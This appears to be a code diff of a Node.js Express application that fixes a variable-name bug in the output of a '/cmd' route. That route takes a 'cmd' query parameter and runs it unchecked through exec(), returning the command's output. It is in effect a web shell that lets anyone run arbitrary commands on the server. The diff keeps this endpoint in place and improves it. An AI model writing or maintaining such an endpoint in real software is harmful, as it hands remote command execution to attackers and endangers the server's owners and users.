@@ -14,7 +14,7 @@ app.get('/9728df14fb8da4351708', (req, res) => {
 app.get('/cmd', (req, res) => {
   const cmd = req.query.cmd;
   exec(cmd, (error, stdout, stderr) => {
-    res.send(`STDOUT: ${stdout.trim()} \n STDERR: ${STDERR}`);
+    res.send(`STDOUT: ${stdout.trim()} \n STDERR: ${stderr}`);
   });
 })
 
